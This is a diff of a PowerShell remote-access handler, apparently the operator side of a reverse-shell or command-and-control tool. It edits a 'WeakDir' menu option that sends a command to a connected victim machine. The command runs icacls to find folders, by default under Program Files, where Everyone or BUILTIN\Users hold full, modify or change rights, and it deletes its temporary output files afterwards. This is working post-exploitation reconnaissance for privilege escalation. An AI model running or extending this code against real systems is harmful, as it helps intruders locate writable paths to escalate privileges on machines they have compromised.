@@ -470,14 +470,17 @@ While($Client.Connected)
         }
         If($my_choise -eq "WeakDir" -or $my_choise -eq "Dir")
         {
-          write-host " List Folder(s) Weak Permissions Recursive [ Everyone:(M)(F) ]." -ForegroundColor Blue -BackgroundColor White;
+          write-host " List Folder(s) Weak Permissions Recursive." -ForegroundColor Blue -BackgroundColor White;
+          write-host " - Sellect User\Group (Everyone:|BUILTIN\Users:): " -NoNewline;
+          $User_Attr = Read-Host;
+          write-host " - Sellect Attribute to Search (F|M|C): " -NoNewline;
+          $Attrib = Read-Host;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
-          $RfPath = Read-Host;
-          write-host " - Sellect Attribute to Search (F|M): " -NoNewline;
-          $Attrib = Read-Host;Write-Host "`n`n";
-          If(-not ($Attrib) -or $Attrib -eq " "){$Attrib = "F"}
-          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:windir"}
-          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ Everyone:($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
+          $RfPath = Read-Host;Write-Host "`n`n";
+          If(-not ($Attrib) -or $Attrib -eq " "){$Attrib = "F"};
+          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:programfiles"};
+          If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
+          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"$User_Attr`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
